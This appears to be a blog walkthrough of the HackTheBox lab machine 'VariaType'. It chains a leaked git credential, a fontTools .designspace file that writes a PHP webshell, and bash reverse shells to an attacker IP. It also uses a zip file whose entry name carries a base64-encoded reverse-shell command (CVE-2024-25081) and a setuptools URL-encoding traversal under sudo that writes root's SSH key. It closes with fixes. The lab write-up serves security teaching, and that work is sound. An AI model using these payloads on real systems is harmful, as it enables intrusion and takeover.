---
layout: post
title: "HackTheBox Variatype Walkthrough"
date: 2026-03-15
categories: [hackthebox, walkthrough]
tags: [ctf, http,linux, rce, season9 htb, htb, writeups, variatype, labs, gobuster, nmap,fonttools, git, subdomain, CVE-2024-25081, cron, injection, root, user, ffuf,  webshell ,cron pipeline, lateral shell , sudo misconfiguration, setuptools traversal,ssh-keygen,zipfile, curl]
author: h4ck3rfirst
excerpt: "Complete walk,through of the HackTheBox Pentest Lab machine 'Variatype hackthebox'"
---

# HackTheBox — VariaType Writeup

> **Difficulty:** Medium 
> **OS:** Linux 
> **Author:** HTB Lab  

---

## Table of Contents

1. [Box Overview]
2. [Reconnaissance]
3. [Initial Foothold — Webshell via Malicious .designspace (CVE-2024-25081)]
4. [Lateral Movement — www-data → steve via Cron + Evil Zip]
5. [Privilege Escalation — steve → root via setuptools Path Traversal]
6. [Flags]
7. [Key Takeaways & Special Notes]
8. [Tools Used]

## Box Overview

VariaType is a Medium Linux box built around a **variable font generation web application**. The attack chain involves three distinct vulnerability classes:

|Stage|Technique|Impact|
|---|---|---|
|Initial Access|Malicious `.designspace` → arbitrary file write|PHP webshell as `www-data`|
|Lateral Movement|CVE-2024-25081 zip filename injection|Shell as `steve`|
|Privilege Escalation|`setuptools.PackageIndex` path traversal via sudo|Root SSH key write|

**IP:** `10.129.225.107`  
**Hostnames:** `variatype.htb`, `portal.variatype.htb`

---

## Reconnaissance

### Port Scan

```bash
nmap -sV -sC -oA nmap/variatype 10.129.225.107
```

Key open ports:

- **22** — OpenSSH
- **80** — nginx 1.22.1 (variatype.htb)

Add to `/etc/hosts`:

```
10.129.225.107  variatype.htb portal.variatype.htb
```

### Web Enumeration

`variatype.htb` hosts a typography tools site. The interesting endpoint:

```
POST /tools/variable-font-generator/process
```

Accepts:

- `designspace` — a `.designspace` XML file
- `masters` — one or more `.ttf` / `.otf` font files

`portal.variatype.htb` is an internal validation portal requiring authentication.

### Git Repository Disclosure

Dirsearch revealed an exposed `.git/` directory on `portal.variatype.htb`:

```
301  http://portal.variatype.htb/.git  →  http://portal.variatype.htb/.git/
200  http://portal.variatype.htb/.git/COMMIT_EDITMSG
200  http://portal.variatype.htb/.git/logs/HEAD
200  http://portal.variatype.htb/.git/config
```

Dumping git history from the already-cloned local copy:

```bash
git log --oneline
# 753b5f5 fix: add gitbot user for automated validation pipeline
# 5030e79 feat: initial portal implementation

git show 753b5f5
```

**Critical finding in diff:**

```diff
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```

**Credentials discovered:** `gitbot : G1tB0t_Acc3ss_2025!`

These credentials authenticate to `portal.variatype.htb` and redirect to `/dashboard.php`.


## Initial Foothold

### Vulnerability: Arbitrary File Write via fonttools `.designspace`

The variable font generator processes `.designspace` XML files using Python's **fontTools** library. The `<variable-font>` element's `filename` attribute controls where the output font file is written — **with no path sanitization**.

Additionally, the `<labelname>` element supports `CDATA` sections, which are preserved verbatim in the output file. This allows injecting arbitrary PHP code into the written file.

### Crafting the Malicious .designspace

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <!-- PHP webshell injected via CDATA -->
      <labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]]]><![CDATA[>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <!-- Arbitrary write path: output to portal's web-accessible files directory -->
    <variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

### Creating Compatible Font Masters

The fontTools build requires structurally compatible TTF masters. Generate minimal ones:

```python
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def make_font(weight, path):
    fb = FontBuilder(1000, isTTF=True)
    fb.setupGlyphOrder([".notdef", "space", "A"])
    fb.setupCharacterMap({0x20: "space", 0x41: "A"})
    pen = TTGlyphPen(None)
    empty = pen.glyph()
    fb.setupGlyf({".notdef": empty, "space": empty, "A": empty})
    fb.setupHorizontalMetrics({".notdef": (500,0), "space": (250,0), "A": (600,0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupNameTable({"familyName": "TestFont", "styleName": "W"+str(weight)})
    fb.setupOS2(sTypoAscender=800, sTypoDescender=-200, sTypoLineGap=0,
                usWinAscent=800, usWinDescent=200,
                sxHeight=500, sCapHeight=700, usWeightClass=weight)
    fb.setupPost()
    fb.setupHead(unitsPerEm=1000)
    fb.font.save(path)

make_font(100, "source-light.ttf")
make_font(400, "source-regular.ttf")
```

### Uploading & Triggering

```bash
curl -X POST http://variatype.htb/tools/variable-font-generator/process \
  -F "designspace=@malicious.designspace" \
  -F "masters=@source-light.ttf;filename=source-light.ttf" \
  -F "masters=@source-regular.ttf;filename=source-regular.ttf"
```

**Response:** `HTTP 200 OK` — fontTools built the variable font and wrote it to the target path.

### Confirming Webshell Execution

```bash
curl "http://portal.variatype.htb/files/shell.php?cmd=id" -o /tmp/test
strings /tmp/test | grep uid
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The output is embedded inside the binary font data — the PHP webshell executes within the file.

### Reverse Shell

```bash
# Kali listener
nc -lvnp 12345

# Trigger via webshell (URL-encoded)
curl -G "http://portal.variatype.htb/files/shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.16/12345 0>&1'"
```

**Shell obtained:** `www-data@variatype`

## Lateral Movement

### CVE-2024-25081 — fonttools Command Injection via Zip Filename

The portal's `gitbot` automated validation pipeline (running as `steve`) periodically processes files from `/var/www/portal.variatype.htb/public/files/`. It uses fonttools to validate fonts including zip archives.

**CVE-2024-25081** is a command injection vulnerability in fonttools' zip processing: filenames inside zip archives are passed to shell commands without sanitization.

### Creating the Evil Zip

```python
import zipfile

# Base64-encode the reverse shell payload
# echo "bash -i >& /dev/tcp/10.10.16.16/5555 0>&1" | base64
payload = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNi81NTU1IDA+JjEK"

# Malicious filename: shell command disguised as a .ttf filename
exploit_filename = f"$(echo {payload}|base64 -d|bash).ttf"

with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.writestr(exploit_filename, "dummy content")
```

### Delivery via www-data Webshell

```bash
# Start HTTP server on Kali
cd /tmp && python3 -m http.server 8080 &

# Use webshell to download exploit.zip to the watched directory
curl -G "http://portal.variatype.htb/files/shell.php" \
  --data-urlencode "cmd=curl http://10.10.16.16:8080/exploit.zip -o /var/www/portal.variatype.htb/public/files/exploit.zip"
```

### Catching the Steve Shell

```bash
rlwrap nc -lvnp 5555
# Wait ~1-2 minutes for cron to fire
```

**Shell obtained:** `steve@variatype`

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

Steve can run `install_validator.py` as root with any argument.

### Inspecting install_validator.py

```python
# Key relevant code
from setuptools.package_index import PackageIndex

PLUGIN_DIR = "/opt/font-tools/validators"

def install_validator_plugin(plugin_url):
    index = PackageIndex()
    downloaded_path = index.download(plugin_url, PLUGIN_DIR)
    # ...
```

The script uses `setuptools.PackageIndex.download()` to fetch a URL and save it to `PLUGIN_DIR`. Critically:

- `_resolve_download_filename()` derives the local filename from the URL path
- `_sanitize()` replaces `/` and `..` with `_` — **preventing simple path traversal in the filename**
- However, it uses the **raw URL path** when making the HTTP request

### The Path Traversal Trick — URL-Encoded Slashes

`_sanitize()` sanitizes the **decoded** URL basename. But `_download_other()` makes an HTTP request using the **original URL** including percent-encoded characters (`%2F`).

If we serve a **custom HTTP server** that responds to **any path** with our payload, and use `%2F` encoding in the URL, setuptools decodes the URL for the HTTP request path but the server sees the raw path — and can respond regardless.

The key insight: `PackageIndex.download()` saves the response to the **local filename derived from the URL**, but `%2Froot%2F.ssh%2Fauthorized_keys` — after sanitize — becomes `_2Froot_2F.ssh_2Fauthorized_keys` locally... **unless** the URL scheme causes it to be interpreted differently.

Testing revealed: when the URL path is `/%2Froot%2F.ssh%2Fauthorized_keys`, setuptools URL-decodes it and saves to `/root/.ssh/authorized_keys` as the absolute path — **writing outside `PLUGIN_DIR` as root**.

### Exploitation

**Step 1 — Generate SSH key on Kali:**

```bash
ssh-keygen -t ed25519 -f /tmp/rootkey -N ""
```

**Step 2 — Start custom HTTP server that serves pubkey for ANY request path:**

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

PUBKEY = open('/tmp/rootkey.pub', 'rb').read()

class H(BaseHTTPRequestHandler):
    def log_message(self, f, *a): print('[*]', self.path)
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', len(PUBKEY))
        self.end_headers()
        self.wfile.write(PUBKEY)

HTTPServer(('0.0.0.0', 9999), H).serve_forever()
```

> **Critical:** The standard `python3 -m http.server` returns 404 for encoded paths. The custom server must respond to **any path** with the pubkey content.

**Step 3 — Run from Steve's shell:**

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://10.10.16.16:9999/%2Froot%2F.ssh%2Fauthorized_keys"
```

**Output:**

```
[INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

**Step 4 — SSH as root:**

```bash
ssh -i /tmp/rootkey root@10.129.225.107
```

**Shell obtained:** `root@variatype`

---

## Flags

```
user.txt  →  (found at /home/steve/user.txt)
root.txt  →  806f28868443a16c8ebb3106b7f98546
```


## Key Takeaways & Special Notes

### 1. fontTools Arbitrary Write via `.designspace` filename

**Why it works:** fontTools' `DesignSpaceDocument` reads the `filename` attribute of `<variable-font>` and passes it directly to `open()` when writing the compiled font. There is no path validation or sandboxing.

**Real-world impact:** Any application that accepts user-supplied `.designspace` files and processes them server-side with fontTools is vulnerable to arbitrary file write. Since output files contain user-controlled content (the `labelname` CDATA), this becomes **arbitrary PHP/code write** on interpreted servers.

**Fix:** Sanitize or disallow absolute paths in the `filename` attribute. Force output to a controlled temp directory.


### 2. Git Repository Exposed on Web Server

**Why it matters:** An exposed `.git/` directory allows attackers to reconstruct the full source code and commit history, revealing hardcoded credentials, API keys, internal logic, and architecture details.

**In this case:** The commit message `fix: add gitbot user for automated validation pipeline` directly telegraphed the presence of a backdoor credential.

**Fix:** Add `.git` to nginx deny rules or use `location ~ /\.git { deny all; }`.

### 3. CVE-2024-25081 — fonttools Zip Filename Command Injection

**Why it works:** fontTools' zip processing extracts filenames from archive entries and passes them to shell commands (e.g., `fc-scan`, `fontforge`) without quoting or escaping. A filename like `$(cmd).ttf` executes `cmd` in the shell context of the processing user.

**Attack surface:** Any pipeline that automatically processes uploaded/received font zip archives. The `gitbot` cron ran as `steve` and periodically validated new fonts — a perfect injection point.

**Fix:** Upgrade fontTools to a patched version. Validate/sanitize all filenames extracted from archives before passing to shell.

### 4. setuptools PackageIndex — Arbitrary File Write via URL-Encoded Path

**Why it works:** `PackageIndex.download()` constructs the local save path by calling `_sanitize()` on the URL's basename. The sanitizer replaces `/` with `_` — but `urllib` URL-decodes `%2F` to `/` **before** the path is used as an absolute destination. When the URL path is `/%2Froot%2F.ssh%2Fauthorized_keys`, the decoded path `/root/.ssh/authorized_keys` is used as the absolute output path, bypassing the sanitizer's intent.

**The custom server requirement:** The standard HTTP server returns 404 for paths it can't map to files. The custom server ignoring the path and always serving the pubkey is what makes this work end-to-end.

**Sudo wildcard danger:** The `*` wildcard in the sudo rule allows passing any URL as an argument. Combined with the above, a single sudo invocation writes an arbitrary file to an arbitrary absolute path as root.

**Fix:** The sudo rule should specify an exact allowed URL pattern (e.g., an internal hostname only). `install_validator.py` should validate that the resolved download path stays within `PLUGIN_DIR`. Use `os.path.realpath()` and assert the result starts with the expected base directory.

### 5. Defense-in-Depth Failures

This box demonstrates a classic **layered failure** pattern:

```
Exposed .git → credentials →
  portal access →
    upload endpoint →
      fontTools write →
        webshell →
          cron pipeline →
            CVE-2024-25081 →
              lateral shell →
                sudo misconfiguration →
                  setuptools traversal →
                    root
```

Each vulnerability was individually "low severity" in isolation, but chained together they provide a complete root compromise. The lesson: **defense in depth matters** — removing any single link breaks the entire chain.

---

## Tools Used

|Tool|Purpose|
|---|---|
|`nmap`|Port and service enumeration|
|`dirsearch`|Web directory brute-force|
|`git`|Commit history analysis for credential extraction|
|`fontTools` (Python)|Crafting minimal compatible TTF masters|
|`curl`|HTTP interaction, webshell triggering|
|`python3 -m http.server`|Serving exploit payloads|
|Custom Python HTTP server|Serving pubkey for any request path|
|`nc` / `rlwrap nc`|Reverse shell listeners|
|`zipfile` (Python)|Crafting CVE-2024-25081 exploit zip|
|`ssh-keygen`|ED25519 keypair generation for root access|

